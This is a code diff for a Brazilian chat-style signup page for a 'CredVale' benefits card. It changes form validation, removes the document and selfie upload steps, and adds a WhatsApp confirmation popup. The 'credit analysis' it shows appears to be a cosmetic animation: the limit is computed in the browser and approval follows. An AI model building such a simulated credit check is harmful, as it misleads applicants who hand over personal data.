@@ -17,7 +17,7 @@
   const pageFooter  = document.querySelector('.footer');
 
   /* ---- State ---- */
-  const steps = ['Início','CPF','Dados','Endereço','Contato','Perfil','Docs','Análise','Plano','Adesão'];
+  const steps = ['Início','CPF','Dados','Endereço','Contato','Perfil','Análise','Plano','Adesão'];
   let currentStep = -1;
   let waitingInput = false;
   let currentResolve = null;
@@ -28,15 +28,31 @@
     cpf: '', nome: '', nascimento: '', sexo: '',
     cep: '', rua: '', bairro: '', cidade: '', uf: '',
     numero: '', complemento: '',
-    whatsapp: '', email: '',
-    documento: null, selfie: null
+    whatsapp: '', email: ''
   };
 
   let chosenCard = 'virtual'; // 'virtual' | 'fisico'
+  let chosenPlan = '';
   let quizAnswers = {};
 
   /* ---- Cache de preços dos produtos (vindo do painel) ---- */
   var __precos = { virtual: 4.99, fisico: 19.99 };
+
+  /* ---- WhatsApp de suporte (vindo do painel admin) ---- */
+  var __supportWhatsApp = '';
+
+  async function carregarWhatsApp() {
+    try {
+      var d = await API.getSettings();
+      if (d && d.settings && d.settings.whatsapp) {
+        __supportWhatsApp = d.settings.whatsapp.replace(/\D/g,'');
+      }
+    } catch(e) {}
+    if (!__supportWhatsApp) {
+      __supportWhatsApp = sessionStorage.getItem('vs_support_wa') || '5511999999999';
+    }
+    try { sessionStorage.setItem('vs_support_wa', __supportWhatsApp); } catch(e) {}
+  }
 
   /* ---- Session tracking ---- */
   function getDeviceInfo() {
@@ -179,40 +195,40 @@
     '</svg></div>';
   }
 
-  function gerarCardGrande(nome) {
+  function gerarCardPremium(nome) {
     var nd = abreviarNome(nome||'TITULAR');
-    return '<div class="chat-card-welcome"><div class="chat-card-welcome__glow"></div><svg viewBox="0 0 340 210" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:280px;height:auto;display:block;margin:0 auto;border-radius:16px;box-shadow:0 12px 40px rgba(0,0,0,0.5);">'+
+    return '<div class="chat-card-welcome"><div class="chat-card-welcome__glow"></div><svg viewBox="0 0 340 210" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:280px;height:auto;display:block;margin:0 auto;border-radius:16px;box-shadow:0 12px 40px rgba(11,108,244,0.35),0 4px 12px rgba(0,200,83,0.15);">'+
       '<defs>'+
-        '<linearGradient id="cardBgW" x1="0" y1="0" x2="1" y2="1">'+
-          '<stop offset="0%" stop-color="#0f172a"/>'+
-          '<stop offset="50%" stop-color="#1e293b"/>'+
-          '<stop offset="100%" stop-color="#0d9488"/>'+
+        '<linearGradient id="cardPremiumBg" x1="0" y1="0" x2="1" y2="1">'+
+          '<stop offset="0%" stop-color="#0B6CF4"/>'+
+          '<stop offset="50%" stop-color="#059669"/>'+
+          '<stop offset="100%" stop-color="#00C853"/>'+
         '</linearGradient>'+
-        '<linearGradient id="cardLogoW" x1="0" y1="0" x2="1" y2="1">'+
-          '<stop offset="0%" stop-color="#3B82F6"/>'+
-          '<stop offset="100%" stop-color="#4CC8A4"/>'+
-        '</linearGradient>'+
-        '<linearGradient id="chipGradW" x1="0" y1="0" x2="1" y2="1">'+
-          '<stop offset="0%" stop-color="#fbbf24"/>'+
-          '<stop offset="100%" stop-color="#d97706"/>'+
-        '</linearGradient>'+
-        '<radialGradient id="cardGlowW" cx="50%" cy="50%" r="70%">'+
-          '<stop offset="0%" stop-color="rgba(76,200,164,0.12)"/>'+
+        '<radialGradient id="cardPremiumGlow" cx="30%" cy="30%" r="80%">'+
+          '<stop offset="0%" stop-color="rgba(255,255,255,0.15)"/>'+
           '<stop offset="100%" stop-color="transparent"/>'+
         '</radialGradient>'+
       '</defs>'+
-      '<rect width="340" height="210" rx="16" fill="url(#cardBgW)"/>'+
-      '<rect width="340" height="210" rx="16" fill="url(#cardGlowW)"/>'+
-      '<rect x="28" y="34" width="44" height="34" rx="5" fill="url(#chipGradW)" opacity="0.9"/>'+
-      '<text x="312" y="55" font-family="\'Space Grotesk\',Arial,sans-serif" font-size="13" font-weight="800" fill="url(#cardLogoW)" text-anchor="end">CREDVALE</text>'+
-      '<circle cx="278" cy="76" r="12" fill="#eb001b" opacity="0.6"/>'+
-      '<circle cx="290" cy="76" r="12" fill="#f79e1b" opacity="0.6"/>'+
-      '<text x="28" y="118" font-family="\'Courier New\',monospace" font-size="18" font-weight="700" fill="white" letter-spacing="3">****  ****  ****  0000</text>'+
-      '<text x="28" y="152" font-family="Arial,sans-serif" font-size="10" fill="rgba(255,255,255,0.5)">TITULAR</text>'+
-      '<text x="28" y="170" font-family="Arial,sans-serif" font-size="14" font-weight="600" fill="white">'+nd+'</text>'+
-      '<text x="300" y="152" font-family="Arial,sans-serif" font-size="10" fill="rgba(255,255,255,0.5)" text-anchor="end">VALIDADE</text>'+
-      '<text x="300" y="170" font-family="Arial,sans-serif" font-size="14" font-weight="600" fill="white" text-anchor="end">12/28</text>'+
-      '<text x="28" y="198" font-family="Arial,sans-serif" font-size="11" fill="rgba(255,255,255,0.6)">Cart\u00e3o de Benef\u00edcios</text>'+
+      '<rect width="340" height="210" rx="16" fill="url(#cardPremiumBg)"/>'+
+      '<rect width="340" height="210" rx="16" fill="url(#cardPremiumGlow)"/>'+
+      /* Decorative circles */
+      '<circle cx="290" cy="30" r="100" fill="rgba(255,255,255,0.05)"/>'+
+      '<circle cx="330" cy="50" r="60" fill="rgba(255,255,255,0.03)"/>'+
+      /* Logo + Brand */
+      '<image x="26" y="28" width="28" height="28" href="/assets/logo-app.png" preserveAspectRatio="xMidYMid meet"/>'+
+      '<text x="62" y="48" font-family="\'Space Grotesk\',Arial,sans-serif" font-size="14" font-weight="800" fill="#ffffff" letter-spacing="2.5">CREDVALE</text>'+
+      /* Chip */
+      '<rect x="28" y="78" width="42" height="32" rx="5" fill="rgba(255,255,255,0.18)"/>'+
+      '<rect x="31" y="81" width="36" height="26" rx="3" fill="rgba(255,255,255,0.1)"/>'+
+      /* Card number */
+      '<text x="28" y="143" font-family="\'Courier New\',monospace" font-size="20" font-weight="700" fill="#ffffff" letter-spacing="3">\u2605\u2605\u2605\u2605  \u2605\u2605\u2605\u2605  \u2605\u2605\u2605\u2605  0000</text>'+
+      /* Labels */
+      '<text x="28" y="174" font-family="Arial,sans-serif" font-size="8" fill="rgba(255,255,255,0.5)" letter-spacing="0.5">TITULAR</text>'+
+      '<text x="28" y="192" font-family="Arial,sans-serif" font-size="14" font-weight="600" fill="#ffffff">'+nd+'</text>'+
+      '<text x="312" y="174" font-family="Arial,sans-serif" font-size="8" fill="rgba(255,255,255,0.5)" text-anchor="end" letter-spacing="0.5">VALIDADE</text>'+
+      '<text x="312" y="192" font-family="Arial,sans-serif" font-size="14" font-weight="600" fill="#ffffff" text-anchor="end">12/28</text>'+
+      /* Tag */
+      '<text x="170" y="200" font-family="Arial,sans-serif" font-size="7" fill="rgba(255,255,255,0.3)" text-anchor="middle" letter-spacing="1.2">CREDVALE \u00b7 CART\u00c3O DE BENEF\u00cdCIOS</text>'+
     '</svg></div>';
   }
 
@@ -252,10 +268,14 @@
     chatInput.dataset.mode = mode || 'text';
     waitingInput = true;
     chatInputArea.hidden = false;
-    // Keyboard type for mobile
     var inputmodeMap = { cpf:'numeric', phone:'tel', cep:'numeric', email:'email', number:'numeric', text:'text' };
     chatInput.inputMode = inputmodeMap[mode] || 'text';
-    chatInput.type = (mode==='email') ? 'email' : 'text';
+    if (mode==='email') chatInput.type = 'email';
+    else if (mode==='cpf'||mode==='cep'||mode==='number'||mode==='phone') chatInput.type = 'text';
+    else chatInput.type = 'text';
+    // Limpa estado de validação
+    chatInput.classList.remove('chat-input--error', 'chat-input--valid');
+    showError('');
   }
 
   function hideInput() {
@@ -282,50 +302,6 @@
     scrollDown();
   }
 
-  var _reuseFileInput = null;
-  function _getFileInput() {
-    if (!_reuseFileInput) {
-      _reuseFileInput = document.createElement('input');
-      _reuseFileInput.type = 'file';
-      _reuseFileInput.accept = 'image/*';
-      _reuseFileInput.style.cssText = 'position:fixed;top:-999px;left:-999px;opacity:0;pointer-events:none;';
-      document.body.appendChild(_reuseFileInput);
-    }
-    return _reuseFileInput;
-  }
-
-  function showMediaBtns(captureLabel, uploadLabel, onCapture, onUpload) {
-    var area = document.createElement('div');
-    area.className = 'chat-media-area';
-    area.id = 'chatMediaArea';
-    area.innerHTML =
-      '<button class="chat-media-btn" id="chatMediaCapture"><span class="chat-media-btn__icon">📷</span>'+captureLabel+'</button>'+
-      '<button class="chat-media-btn" id="chatMediaUpload"><span class="chat-media-btn__icon">📁</span>'+uploadLabel+'</button>';
-    chatMsg.appendChild(area);
-    scrollDown();
-    document.getElementById('chatMediaCapture').onclick = function() {
-      var inp = _getFileInput();
-      inp.removeAttribute('capture');
-      inp.setAttribute('capture', 'environment');
-      inp.value = '';
-      inp.onchange = function(e) {
-        var f = e.target.files[0];
-        if (f) { area.remove(); inp.onchange = null; setTimeout(function(){ onCapture(f); }, 50); }
-      };
-      inp.click();
-    };
-    document.getElementById('chatMediaUpload').onclick = function() {
-      var inp = _getFileInput();
-      inp.removeAttribute('capture');
-      inp.value = '';
-      inp.onchange = function(e) {
-        var f = e.target.files[0];
-        if (f) { area.remove(); inp.onchange = null; setTimeout(function(){ onUpload(f); }, 50); }
-      };
-      inp.click();
-    };
-  }
-
   function updateProgress(step) {
     currentStep = step;
     var pct = step / (steps.length - 1) * 100;
@@ -345,11 +321,23 @@
 
   function sendUserInput(value) {
     if (!waitingInput || !value.trim()) return;
+    // Validação em tempo real para phone/email
+    var mode = chatInput.dataset.mode;
+    if (mode === 'cpf' || mode === 'phone' || mode === 'email') {
+      var res = validarInput();
+      if (!res.valido) {
+        aplicarEstadoInput();
+        chatInput.focus();
+        return;
+      }
+    }
     waitingInput = false;
     var v = value.trim();
     addMsg(v, 'user');
     chatInput.value = '';
     chatInput.disabled = true;
+    chatInput.classList.remove('chat-input--error', 'chat-input--valid');
+    showError('');
     scrollDown();
     if (currentResolve) { currentResolve(v); currentResolve = null; }
   }
@@ -378,6 +366,82 @@
     if (popupEl) { popupEl.remove(); popupEl = null; }
   }
 
+  /* ---- Validação ---- */
+  var errorEl = document.getElementById('chatInputError');
+
+  function showError(msg) {
+    if (!errorEl) return;
+    if (msg) {
+      errorEl.textContent = msg;
+      errorEl.hidden = false;
+    } else {
+      errorEl.hidden = true;
+      errorEl.textContent = '';
+    }
+  }
+
+  function validarCPF() {
+    var v = chatInput.value.replace(/\D/g,'');
+    if (v.length === 0) return { valido: false, msg: '' };
+    if (v.length !== 11) return { valido: false, msg: 'Informe um CPF válido.' };
+    // Rejeita sequências iguais (111.111.111-11, etc.)
+    if (/^(\d)\1{10}$/.test(v)) return { valido: false, msg: 'Informe um CPF válido.' };
+    // Valida 1º dígito verificador
+    var soma = 0;
+    for (var i = 0; i < 9; i++) soma += parseInt(v.charAt(i)) * (10 - i);
+    var resto = (soma * 10) % 11;
+    if (resto === 10) resto = 0;
+    if (resto !== parseInt(v.charAt(9))) return { valido: false, msg: 'Informe um CPF válido.' };
+    // Valida 2º dígito verificador
+    soma = 0;
+    for (var j = 0; j < 10; j++) soma += parseInt(v.charAt(j)) * (11 - j);
+    resto = (soma * 10) % 11;
+    if (resto === 10) resto = 0;
+    if (resto !== parseInt(v.charAt(10))) return { valido: false, msg: 'Informe um CPF válido.' };
+    return { valido: true, msg: '' };
+  }
+
+  function validarTelefone() {
+    var v = chatInput.value.replace(/\D/g,'');
+    var digs = v.length;
+    if (digs === 0) return { valido: false, msg: '' };
+    if (digs < 10 || digs > 11) return { valido: false, msg: 'Informe um número de telefone válido.' };
+    // Valida DDD (primeiros 2 dígitos entre 11 e 99)
+    var ddd = parseInt(v.slice(0,2), 10);
+    if (ddd < 11 || ddd > 99 || ddd % 10 === 0) return { valido: false, msg: 'Informe um número de telefone válido.' };
+    return { valido: true, msg: '' };
+  }
+
+  function validarEmail() {
+    var v = chatInput.value.trim();
+    if (v.length === 0) return { valido: false, msg: '' };
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v)) return { valido: false, msg: 'Informe um e-mail válido.' };
+    return { valido: true, msg: '' };
+  }
+
+  function validarInput() {
+    var mode = chatInput.dataset.mode;
+    if (mode === 'cpf') return validarCPF();
+    if (mode === 'phone') return validarTelefone();
+    if (mode === 'email') return validarEmail();
+    return { valido: true, msg: '' };
+  }
+
+  function aplicarEstadoInput() {
+    var res = validarInput();
+    chatInput.classList.remove('chat-input--error', 'chat-input--valid');
+    if (res.valido && chatInput.value.trim().length > 0) {
+      chatInput.classList.add('chat-input--valid');
+      showError('');
+    } else if (!res.valido && res.msg) {
+      chatInput.classList.add('chat-input--error');
+      showError(res.msg);
+    } else {
+      showError('');
+    }
+    return res.valido;
+  }
+
   /* ---- Eventos do input ---- */
   chatSend.addEventListener('click', function() { sendUserInput(chatInput.value); });
 
@@ -391,6 +455,21 @@
     } else if (chatInput.dataset.mode === 'cep') {
       requestAnimationFrame(function() { chatInput.value = fmtCep(chatInput.value); });
     }
+  });
+
+  chatInput.addEventListener('input', function() {
+    var mode = chatInput.dataset.mode;
+    if (mode === 'cpf') {
+      requestAnimationFrame(function() { chatInput.value = fmtCpf(chatInput.value); });
+    } else if (mode === 'phone') {
+      requestAnimationFrame(function() { chatInput.value = fmtPhone(chatInput.value); });
+    }
+    if (mode === 'cpf' || mode === 'phone' || mode === 'email') aplicarEstadoInput();
+  });
+
+  chatInput.addEventListener('blur', function() {
+    var mode = chatInput.dataset.mode;
+    if (mode === 'cpf' || mode === 'phone' || mode === 'email') aplicarEstadoInput();
   });
 
   window.fecharChat = function() {
@@ -420,15 +499,16 @@
     } else {
       addMsg(
         '<div class="chat-welcome-v2">'+
-          '<div class="chat-welcome-v2__badge">⏱ 2 minutos</div>'+
-          gerarCardGrande()+
-          '<div class="chat-welcome-v2__title">Vamos começar<br>sua solicitação</div>'+
-          '<div class="chat-welcome-v2__desc">Responda algumas perguntas e em <strong>até 2 minutos</strong> você descobre seu limite.</div>'+
-          '<button class="chat-welcome-v2__btn" onclick="window._iniciarChat()">'+
-            'Iniciar <span class="chat-welcome-v2__btn-arrow">→</span>'+
-          '</button>'+
+          gerarCardPremium()+
+          '<div class="chat-welcome-v2__title">💚 Economize mais com o CredVale!</div>'+
+          '<div class="chat-welcome-v2__desc">'+
+            'Garanta <strong>até 75% de desconto</strong> em medicamentos e solicite seu cartão com análise rápida.'+
+          '</div>'+
+          '<div class="chat-welcome-v2__badge">⏱ 2 minutos · sem burocracia</div>'+
         '</div>'
       );
+      addMsg('<strong>Informe seu CPF</strong> para continuar.');
+      etapaCPF(true);
     }
   }
 
@@ -459,19 +539,19 @@
   };
 
   /* ---- ETAPA 1: CPF ---- */
-  async function etapaCPF() {
+  async function etapaCPF(skipGreeting) {
     flowState = 'cpf';
     updateProgress(1);
-    await sleep(300);
-    addTyping(); await sleep(600); removeTyping();
-
-    addMsg('Olá! 👋<br>Vamos localizar seu cadastro.<br><strong>Informe seu CPF.</strong>');
+    if (!skipGreeting) {
+      await sleep(300);
+      addTyping(); await sleep(600); removeTyping();
+      addMsg('Olá! 👋<br>Vamos localizar seu cadastro.<br><strong>Informe seu CPF.</strong>');
+    }
     setInput('Digite seu CPF', 'cpf');
 
     while (true) {
       var cpf = await waitUserInput();
       cpf = cpf.replace(/\D/g,'');
-      if (cpf.length !== 11) { addMsg('CPF inválido. Digite 11 números.', 'bot'); setInput('Digite seu CPF', 'cpf'); continue; }
       user.cpf = cpf;
 
       // Verifica CPF existente no backend
@@ -493,7 +573,7 @@
         user.nome = dados.nome_completo||dados.nome||'';
         user.nascimento = dados.data_nascimento||'';
         user.sexo = dados.sexo||'';
-        addMsg('<strong>Encontramos seus dados!</strong>', 'bot');
+        addMsg('<strong>Localizamos seu cadastro.</strong>', 'bot');
         var nasc = user.nascimento||'—';
         var idade = user.nascimento ? ' · '+calcIdade(user.nascimento)+' anos' : '';
         var sexo = user.sexo==='F'?'Feminino':user.sexo==='M'?'Masculino':user.sexo||'—';
@@ -505,7 +585,7 @@
         return;
       }
       // Não encontrou na API externa
-      addMsg('Não localizamos automaticamente. Vou precisar que <strong>digite seus dados</strong>.', 'bot');
+      addMsg('Não encontramos um cadastro anterior. <strong>Vamos criar um novo cadastro.</strong>', 'bot');
       etapaCPFEditar();
       return;
     }
@@ -556,11 +636,15 @@
         await sleep(200);
         addMsg('Qual o <strong>número</strong>?');
         setInput('Número', 'number');
-        user.numero = await waitUserInput();
-        addMsg('Complemento? (ou digite —)');
-        setInput('Complemento ou —');
-        var c = await waitUserInput();
-        user.complemento = (c==='—'||c==='-')?'':c;
+        user.numero = await waitUserInput();        addMsg('<strong>Complemento?</strong> (opcional)');
+        hideInput();
+        user.complemento = await new Promise(function(resolve) {
+          addMsg('<div style="font-size:0.78rem;color:#475569;text-align:center;padding:2px 0 8px;">Se n\u00e3o tiver complemento, basta clicar em <strong>Continuar</strong>.</div>');
+          showOptions([
+            { label:'Continuar \u2192', primary:true, action:function(){ resolve(''); } },
+            { label:'\u270f\ufe0f Informar complemento', action:function(){ setInput('Complemento'); waitUserInput().then(function(v){ resolve(v.trim()); }); }}
+          ]);
+        });
         etapaContato();
         return;
       }
@@ -571,8 +655,15 @@
       addMsg('Qual a <strong>cidade</strong>?'); setInput('Cidade'); user.cidade = await waitUserInput();
       addMsg('Qual o <strong>estado</strong>? (sigla: SP, RJ...)'); setInput('Ex: SP'); user.uf = (await waitUserInput()).toUpperCase();
       addMsg('Qual o <strong>número</strong>?'); setInput('Número', 'number'); user.numero = await waitUserInput();
-      addMsg('Complemento? (ou —)'); setInput('Complemento ou —'); var c2 = await waitUserInput();
-      user.complemento = (c2==='—'||c2==='-')?'':c2;
+      addMsg('<strong>Complemento?</strong> (opcional)');
+      hideInput();
+      user.complemento = await new Promise(function(resolve) {
+        addMsg('<div style="font-size:0.78rem;color:#475569;text-align:center;padding:2px 0 8px;">Se n\u00e3o tiver complemento, basta clicar em <strong>Continuar</strong>.</div>');
+        showOptions([
+          { label:'Continuar \u2192', primary:true, action:function(){ resolve(''); } },
+          { label:'\u270f\ufe0f Informar complemento', action:function(){ setInput('Complemento'); waitUserInput().then(function(v){ resolve(v.trim()); }); }}
+        ]);
+      });
       etapaContato();
       return;
     }
@@ -590,8 +681,41 @@
     while (true) {
       var p = await waitUserInput();
       p = p.replace(/\D/g,'');
-      if (p.length<10) { addMsg('Número inválido.', 'bot'); setInput('(11) 99999-9999','phone'); continue; }
-      user.whatsapp = p; addMsg('WhatsApp: <strong>'+formatarTelefone(p)+'</strong>', 'user'); break;
+      if (!p || p.length < 10) continue;
+      user.whatsapp = p;
+      var phoneFmt = formatarTelefone(p);
+      addMsg('WhatsApp: <strong>'+phoneFmt+'</strong>', 'user');
+
+      hideInput();
+      var waHtml =
+        '<div style="display:flex;flex-direction:column;align-items:center;gap:10px;padding:8px 0;">'+
+          '<div style="width:56px;height:56px;border-radius:50%;background:#25D366;display:flex;align-items:center;justify-content:center;">'+
+            '<svg width="28" height="28" viewBox="0 0 24 24" fill="white"><path d="M12 0C5.373 0 0 5.373 0 12c0 6.627 5.373 12 12 12s12-5.373 12-12S18.627 0 12 0zm6.262 15.264c-.104.262-.389.522-.793.736-.404.214-1.009.346-1.593.382-.593.036-1.152.042-1.707-.086-.564-.129-1.147-.337-1.747-.617-1.21-.566-2.326-1.387-3.364-2.333-1.036-.946-1.861-2.068-2.428-3.285-.283-.607-.485-1.21-.596-1.807-.111-.597-.106-1.159-.01-1.628.096-.469.264-.826.483-1.1.22-.274.455-.42.679-.476.224-.056.448-.033.672.01.224.042.448.115.672.222.224.107.448.269.672.486.224.217.448.508.672.872.112.183.206.366.283.549.077.183.115.37.115.562 0 .192-.038.398-.115.618-.077.22-.182.44-.317.66-.134.22-.288.425-.462.615-.173.19-.367.377-.582.56.038.115.092.24.163.374.07.134.156.276.259.425.103.149.224.307.365.473.14.166.297.338.47.515.218.224.419.422.603.594.184.172.352.32.504.445.152.125.286.226.403.303.117.077.216.13.298.16.081.03.145.05.192.06.047.01.076.01.086 0 .01-.01.024-.065.043-.166.019-.101.042-.244.07-.429.028-.185.05-.38.066-.586.016-.206.019-.393.01-.56-.01-.168-.03-.3-.062-.397-.032-.097-.063-.16-.094-.19-.031-.03-.048-.046-.052-.048 0-.002.031-.035.094-.098.063-.064.153-.164.27-.3.117-.136.251-.3.403-.492.152-.192.292-.396.42-.612.128-.216.28-.478.454-.786.174-.308.306-.613.396-.915.09-.302.135-.579.135-.832 0-.16-.021-.3-.064-.422-.043-.122-.095-.214-.156-.276-.06-.062-.12-.104-.18-.125-.06-.021-.098-.032-.113-.032l-.348-.048c-.246-.033-.53-.05-.852-.05-.32 0-.668.032-1.043.096-.375.064-.734.16-1.077.29-.343.13-.658.284-.945.462-.287.178-.537.363-.75.556-.213.192-.38.367-.5.524-.12.157-.2.27-.24.34l-.095.164c-.033.056-.06.092-.082.108-.022.016-.039.019-.052.01-.013-.01-.032-.036-.057-.078-.025-.042-.064-.115-.116-.22-.052-.104-.113-.246-.183-.425-.07-.179-.17-.402-.3-.668-.13-.266-.272-.545-.425-.838-.153-.293-.322-.577-.507-.852-.185-.275-.365-.508-.54-.699-.175-.191-.33-.323-.465-.397-.135-.074-.238-.112-.31-.115-.072-.003-.1-.003-.083 0z"/></svg>'+
+          '</div>'+
+          '<div style="font-size:1.1rem;font-weight:800;color:#0f172a;">Seu WhatsApp está correto?</div>'+
+          '<div style="font-size:1.3rem;font-weight:900;padding:10px 0;letter-spacing:1px;color:#075E54;">'+phoneFmt+'</div>'+
+          '<div style="display:flex;gap:10px;width:100%;margin-top:4px;">'+
+            '<button class="chat-option chat-option--primary" id="waConfirmYes" style="flex:1;padding:14px;font-size:0.9rem;">✅ Confirmar</button>'+
+            '<button class="chat-option chat-option--danger" id="waConfirmEdit" style="padding:14px;font-size:0.9rem;">✏️ Trocar número</button>'+
+          '</div>'+
+        '</div>';
+
+      showPopup(waHtml);
+
+      var confirmou = await new Promise(function(resolve) {
+        document.getElementById('waConfirmYes').onclick = function() {
+          closePopup();
+          resolve(true);
+        };
+        document.getElementById('waConfirmEdit').onclick = function() {
+          closePopup();
+          addMsg('Digite o <strong>número correto</strong> do WhatsApp:');
+          setInput('(11) 99999-9999','phone');
+          resolve(false);
+        };
+      });
+
+      if (confirmou) break;
     }
 
     await sleep(200);
@@ -599,7 +723,6 @@
     setInput('seu@email.com','email');
     while (true) {
       var e = await waitUserInput();
-      if (!e.includes('@')||!e.includes('.')) { addMsg('E-mail inválido.','bot'); setInput('seu@email.com','email'); continue; }
       user.email = e; addMsg('E-mail: <strong>'+e+'</strong>','user'); break;
     }
 
@@ -609,93 +732,7 @@
     etapaQuestionario();
   }
 
-  /* ---- ETAPA 4: Documentos ---- */
-  async function etapaDocs() {
-    flowState = 'docs';
-    updateProgress(6);
-    await sleep(200);
-    addTyping(); await sleep(600); removeTyping();
-
-    addMsg('📋 <strong>Perfeito!</strong> Agora precisamos validar sua identidade.<br><br>Tenha em mãos:<br>• 🆔 Documento oficial com foto (RG ou CNH)<br>• ☀️ Um ambiente iluminado para selfie');
-
-    showOptions([
-      { label:'📷 Vamos lá!', primary:true, action:function(){
-        addMsg('Envie uma <strong>foto do seu documento</strong> (RG ou CNH):');
-        showMediaBtns('📷 Fotografar','📁 Enviar arquivo',
-          function(f){ etapaConfirmarFoto(f, 'documento', function(){ etapaSelfie(); }); },
-          function(f){ etapaConfirmarFoto(f, 'documento', function(){ etapaSelfie(); }); }
-        );
-      }}
-    ]);
-  }
-
-  async function etapaSelfie() {
-    flowState = 'selfie';
-    await sleep(300);
-    addTyping(); await sleep(500); removeTyping();
-
-    addMsg('Agora uma <strong>selfie</strong> 😊<br><br>• Olhe para a câmera<br>• Sem óculos escuros ou boné<br>• Boa iluminação');
-
-    showMediaBtns('🤳 Tirar selfie','📁 Enviar foto',
-      function(f){ etapaConfirmarFoto(f, 'selfie', function(){ etapaIntroAnalise(); }); },
-      function(f){ etapaConfirmarFoto(f, 'selfie', function(){ etapaIntroAnalise(); }); }
-    );
-  }
-
-  /* ---- Preview + Confirmação de Foto ---- */
-  function etapaConfirmarFoto(file, tipo, callback) {
-    var label = tipo==='documento' ? 'Documento' : 'Selfie';
-    var icon = tipo==='documento' ? '\uD83D\uDCC4' : '\uD83E\uDD33';
-    try {
-      var imgUrl = URL.createObjectURL(file);
-      var imgMsg = addMsg('<div style="text-align:center;"><img class="chat-media-preview" src="'+imgUrl+'" style="max-width:240px;max-height:260px;display:block;margin:0 auto;border-radius:12px;"></div>', 'user');
-      addMsg('📸 <strong>'+label+' capturado!</strong> A foto ficou boa?', 'bot');
-      showOptions([
-        { label:'✅ Sim, usar esta', primary:true, action:function(){
-          if (tipo==='documento') user.documento = file;
-          else user.selfie = file;
-          URL.revokeObjectURL(imgUrl);
-          imgMsg.innerHTML = '<div style="text-align:center;padding:6px 0;font-size:0.85rem;color:#4CC8A4;font-weight:600;">'+icon+' '+label+' enviado \u2713</div>';
-          addMsg('✅ '+label+' confirmado!','bot');
-          setTimeout(callback, 400);
-        }},
-        { label:'🔄 Tirar novamente', danger:true, action:function(){
-          URL.revokeObjectURL(imgUrl);
-          addMsg('OK, vamos tentar novamente:','bot');
-          if (tipo==='documento') {
-            showMediaBtns('📷 Fotografar','📁 Enviar arquivo',
-              function(f2){ etapaConfirmarFoto(f2, 'documento', callback); },
-              function(f2){ etapaConfirmarFoto(f2, 'documento', callback); }
-            );
-          } else {
-            showMediaBtns('🤳 Tirar selfie','📁 Enviar foto',
-              function(f2){ etapaConfirmarFoto(f2, 'selfie', callback); },
-              function(f2){ etapaConfirmarFoto(f2, 'selfie', callback); }
-            );
-          }
-        }}
-      ]);
-    } catch(e) {
-      addMsg('❌ Erro ao carregar a foto. Tente novamente.','bot');
-      setTimeout(function(){
-        if (tipo==='documento') {
-          showMediaBtns('📷 Fotografar','📁 Enviar arquivo',
-            function(f2){ etapaConfirmarFoto(f2, 'documento', callback); },
-            function(f2){ etapaConfirmarFoto(f2, 'documento', callback); }
-          );
-        } else {
-          showMediaBtns('🤳 Tirar selfie','📁 Enviar foto',
-            function(f2){ etapaConfirmarFoto(f2, 'selfie', callback); },
-            function(f2){ etapaConfirmarFoto(f2, 'selfie', callback); }
-          );
-        }
-      }, 400);
-    }
-  }
-
-  /* ---- (dead code removed) ---- */
-
-  /* ---- ETAPA 4B: Questionário de Perfil ---- */
+  /* ---- Questionário de Perfil ---- */
   async function etapaQuestionario() {
     flowState = 'quiz';
     hideInput();
@@ -734,7 +771,7 @@
       ]);
     });
 
-    // Após questionário → LGPD + Docs
+    // Após questionário → LGPD
     await sleep(300);
     addTyping(); await sleep(500); removeTyping();
     addMsg('✅ <strong>Perfil registrado!</strong> Agora precisamos da sua autorização:', 'bot');
@@ -748,7 +785,7 @@
       { label:'✅ Aceito e continuar', primary:true, action:function(){
         if (!document.getElementById('chkTermos')?.checked) { addMsg('Marque a caixa para aceitar os termos.','bot'); return; }
         document.getElementById('chatTermos')?.remove();
-        trackStage('Preenchendo Cadastro'); etapaDocs();
+        trackStage('Preenchendo Cadastro'); etapaIntroAnalise();
       }}
     ]);
   }
@@ -824,7 +861,7 @@
   /* ---- ANÁLISE AUTOMÁTICA + POPUP APROVAÇÃO ---- */
   async function etapaAnalisePopup() {
     trackStage('Analisando Crédito');
-    updateProgress(7);
+    updateProgress(6);
     var clientId = 'CLI-'+Date.now().toString(36).toUpperCase();
     var limite = (function() {
       var base = 1800;
@@ -842,10 +879,10 @@
     hideInput();
 
     var steps = [
-      { label:'Validando documentos', done:false },
-      { label:'Conferindo selfie', done:false },
+      { label:'Verificando CPF', done:false },
+      { label:'Analisando dados cadastrais', done:false },
       { label:'Analisando questionário', done:false },
-      { label:'Consultando cadastro', done:false },
+      { label:'Consultando referências', done:false },
       { label:'Calculando limite', done:false },
       { label:'Preparando proposta', done:false }
     ];
@@ -894,7 +931,28 @@
       navegador: sessionStorage.getItem('vs_navegador')||'',
       navegador_versao: sessionStorage.getItem('vs_navegador_versao')||''
     };
-    var apiResult = await API.createClient(apiData).catch(function(){ return null; });
+    // Cria o cliente via fetch direto (para capturar clientId mesmo em caso de 409 - CPF já existente)
+    var apiResult = null;
+    try {
+      var baseUrl = window.__API_BASE || '/api';
+      var resp = await fetch(baseUrl + '/clients', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(apiData)
+      });
+      var respData = await resp.json();
+      if (resp.ok) {
+        apiResult = respData;
+      } else if (resp.status === 409 && respData.clientId) {
+        // CPF já existe no sistema (aprovado/ativado) — usa o clientId retornado
+        apiResult = { clientId: respData.clientId };
+        console.log('[cadastro] CPF já existente, usando clientId:', respData.clientId);
+      } else {
+        console.error('[cadastro] Erro ao criar cliente:', respData.error);
+      }
+    } catch(e) {
+      console.error('[cadastro] Exceção ao criar cliente:', e);
+    }
     clientId = apiResult ? apiResult.clientId : clientId;
     if (apiResult) {
       trackStage('Cadastro Aprovado', {nome: user.nome, cpf: user.cpf});
@@ -918,18 +976,18 @@
           '</div>'+
           '<div style="display:flex;align-items:center;justify-content:center;gap:6px;margin-bottom:8px;">'+
             '<span style="font-size:1.8rem;line-height:1;">🎉</span>'+
-            '<div style="font-size:1.25rem;font-weight:800;color:#e2e8f0;">Parabéns, <span style="background:linear-gradient(135deg,#4CC8A4,#3B82F6);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;">'+nomePrimeiro+'</span>!</div>'+
+            '<div style="font-size:1.25rem;font-weight:800;color:#0f172a;">Parabéns, <span style="background:linear-gradient(135deg,#4CC8A4,#3B82F6);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;">'+nomePrimeiro+'</span>!</div>'+
           '</div>'+
